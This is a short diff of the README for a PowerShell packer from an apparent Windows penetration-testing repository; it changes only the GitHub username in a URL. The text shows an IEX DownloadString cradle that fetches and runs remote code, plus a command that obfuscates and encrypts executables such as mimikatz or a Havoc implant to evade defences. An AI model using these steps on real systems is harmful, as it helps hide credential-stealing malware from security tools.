@@ -18,7 +18,7 @@ It generates an obfuscated and encrypted PowerShell script that contains the PE 
   - STEP 1. Generate an obfuscated & encrypted PowerShell script that contains your PE file (e.g. mimikatz.exe, havocdemon.exe) stored locally or on a remote web server.
 ```
 [*] First load the packer
-    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');
+    PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JFR-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');
 
 [*] Then "pack/obfuscate" a Portable Executable file stored locally (with or without the sandbox checks enabled)
     PS C:\> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
